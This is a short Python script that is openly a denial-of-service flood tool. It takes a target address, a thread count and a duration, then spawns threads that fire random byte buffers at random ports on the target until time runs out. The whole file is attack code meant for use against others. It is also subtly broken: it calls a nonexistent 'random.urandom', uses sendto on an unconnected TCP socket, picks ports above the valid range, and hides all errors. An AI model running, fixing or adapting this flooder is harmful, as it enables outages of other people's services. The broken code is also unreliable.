import threading, socket, random, threading, sys, time

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print('\n[+] Command usage: python' + sys.argv[0] + '<target> <threads> <time> !')
    sys.exit()
timeout = time.time() +1 * timer

def attack():
    try:
        bytes = random.urandom(1080)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() < timeout:
            dport = random.randint(20,99999)
            s.sendto(bytes*random.randint(5,15),(target, dport))
        return
        sys.exit()
    except:
        pass
print('\n[+] Starting Attack.....')
for x in range(0, threads):
    threading.Thread(target=attack).start()
print('\n[+] Attack Done.')
